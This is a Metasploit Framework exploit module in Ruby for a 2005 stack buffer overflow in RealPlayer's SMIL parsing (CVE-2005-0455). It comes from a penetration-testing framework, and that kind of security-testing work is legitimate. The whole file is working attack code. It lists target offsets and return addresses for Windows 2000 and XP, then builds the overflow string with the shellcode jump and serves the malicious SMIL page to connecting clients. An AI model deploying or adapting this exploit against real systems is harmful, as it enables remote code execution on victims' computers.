##
# $Id: realplayer_smil.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \\\'msf/core\\\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			\\\'Name\\\'           => \\\'RealNetworks RealPlayer SMIL Buffer Overflow\\\',
			\\\'Description\\\'    => %q{
					This module exploits a stack buffer overflow in RealNetworks RealPlayer 10 and 8.
				By creating a URL link to a malicious SMIL file, a remote attacker could
				overflow a buffer and execute arbitrary code.
				When using this module, be sure to set the URIPATH with an extension of \\\'.smil\\\'.
				This module has been tested with RealPlayer 10 build 6.0.12.883 and RealPlayer 8
				build 6.0.9.584.
			},
			\\\'License\\\'        => MSF_LICENSE,
			\\\'Author\\\'         => \\\'MC\\\',
			\\\'Version\\\'        => \\\'$Revision: 9262 $\\\',
			\\\'References\\\'     =>
				[
					[ \\\'CVE\\\', \\\'2005-0455\\\' ],
					[ \\\'OSVDB\\\', \\\'14305\\\'],
					[ \\\'BID\\\', \\\'12698\\\' ],
				],

			\\\'DefaultOptions\\\' =>
				{
					\\\'EXITFUNC\\\' => \\\'process\\\',
				},

			\\\'Payload\\\'        =>
				{
					\\\'Space\\\'    => 500,
					\\\'BadChars\\\' => \\\"\\\\x00\\\\x90\\\\x0a\\\\x0d\\\\x20\\\\x3c\\\\x3e\\\\x2f\\\\x5c\\\\x22\\\\x58\\\\x3d\\\\x3b\\\\x40\\\\x3f\\\\x27\\\\x26\\\\x25\\\",
					\\\'StackAdjustment\\\' => -3500,
				},
			\\\'Platform\\\' => \\\'win\\\',
			\\\'Targets\\\'        =>
				[
					[ \\\'RealPlayer 10/8 on Windows 2000 SP0-SP4 English\\\',     { \\\'Offset\\\' => 608, \\\'Ret\\\' => 0x75022ac4 } ],
					[ \\\'RealPlayer 10/8 on Windows XP PRO SP0-SP1 English\\\',   { \\\'Offset\\\' => 584, \\\'Ret\\\' => 0x71aa2461 } ],
				],
			\\\'Privileged\\\'     => false,
			\\\'DisclosureDate\\\' => \\\'Mar 1 2005\\\',
			\\\'DefaultTarget\\\'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		cruft  =  rand_text_alpha_upper(1)
		bleh   =  rand_text_alpha_upper(11)

		sploit =  rand_text_alpha_upper(target[\\\'Offset\\\']) + payload.encoded
		sploit << \\\"\\\\xeb\\\\x06\\\" + rand_text_alpha_upper(2) + [target.ret].pack(\\\'V\\\')
		sploit << [0xe8, -485].pack(\\\'CV\\\')

		# Build the HTML content
		content =  \\\"<smil><head><layout><region id=\\\\\\\"#{cruft}\\\\\\\" top=\\\\\\\"#{cruft}\\\\\\\" /></layout></head>\\\"
		content << \\\"<body><text src=\\\\\\\"#{bleh}.txt\\\\\\\" region=\\\\\\\"size\\\\\\\" system-screen-size=\\\\\\\"#{sploit}\\\\\\\" /></body></smil>\\\"

		print_status(\\\"Sending exploit to #{cli.peerhost}:#{cli.peerport}...\\\")

		# Transmit the response to the client
		send_response_html(cli, content, { \\\'Content-Type\\\' => \\\'text/html\\\' })

		# Handle the payload
		handler(cli)
	end

end
